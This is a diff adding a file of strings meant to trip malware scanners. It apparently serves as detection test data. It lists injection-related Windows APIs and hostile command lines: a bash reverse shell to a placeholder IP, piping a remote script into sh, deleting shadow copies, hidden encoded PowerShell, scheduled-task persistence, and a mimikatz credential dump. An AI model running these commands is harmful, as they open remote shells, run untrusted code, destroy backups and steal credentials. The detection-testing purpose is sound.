@@ -1,0 +1,30 @@
+# Strings that heuristic and YARA-style scanners commonly flag.
+# They're inert text; nothing here runs.
+
+# Windows APIs typical of injection and loader code
+VirtualAllocEx
+WriteProcessMemory
+CreateRemoteThread
+NtUnmapViewOfSection
+LoadLibraryA
+GetProcAddress
+IsDebuggerPresent
+SetWindowsHookExA
+MiniDumpWriteDump
+
+# Command lines
+cmd.exe /c whoami
+powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand
+vssadmin delete shadows /all /quiet
+schtasks /create /sc minute /tn contaminate /tr
+rundll32.exe contaminate.dll,EntryPoint
+certutil -urlcache -split -f
+/bin/sh -c
+bash -i >& /dev/tcp/192.0.2.10/4444 0>&1
+chmod +x /tmp/.contaminate/stage2
+curl -fsSL http://example.com/install.sh | sh
+
+# Misc
+mimikatz
+sekurlsa::logonpasswords
+Your files have been encrypted
